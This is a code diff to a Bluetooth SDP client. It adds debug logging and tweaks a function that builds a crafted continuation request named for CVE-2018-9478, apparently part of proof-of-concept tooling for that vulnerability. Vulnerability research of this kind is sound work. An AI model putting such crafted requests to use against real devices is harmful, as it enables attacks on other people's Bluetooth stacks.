@@ -772,12 +772,14 @@ static void sdp_client_parse_service_attribute_response(uint8_t *packet,
     if (offset + 2 + 2 > size)
         return; // parameterLength, attributeListByteCount
     uint16_t parameterLength = big_endian_read_16(packet, offset);
+    log_info("parameterLength = %d", parameterLength);
     offset += 2;
     if (offset + parameterLength > size)
         return;
 
     // AttributeListByteCount <= mtu
     uint16_t attributeListByteCount = big_endian_read_16(packet, offset);
+    log_info("attributeListByteCount = %d", attributeListByteCount);
     offset += 2;
     if (attributeListByteCount > mtu)
     {
@@ -798,7 +800,7 @@ static void sdp_client_parse_service_attribute_response(uint8_t *packet,
         return;
     continuationStateLen = packet[offset];
     offset++;
-    log_info("continuationStateLen = %d", continuationState);
+    log_info("continuationStateLen = %d", continuationStateLen);
 
     if (continuationStateLen > 16)
     {
@@ -920,12 +922,10 @@ uint16_t sdp_client_setup_CVE_2018_9478_cont_request(uint8_t *data)
     }
 
     // cont_state
-    uint16_t cont_state = 0x02;
+    uint8_t cont_state = 0x02;
     data[offset++] = cont_state;
 
     // cont length
-    big_endian_store_16(data, offset, continuationStateLen);
-    offset += 2;
     memcpy(data + offset, continuationState, continuationStateLen);
     offset += continuationStateLen;
 
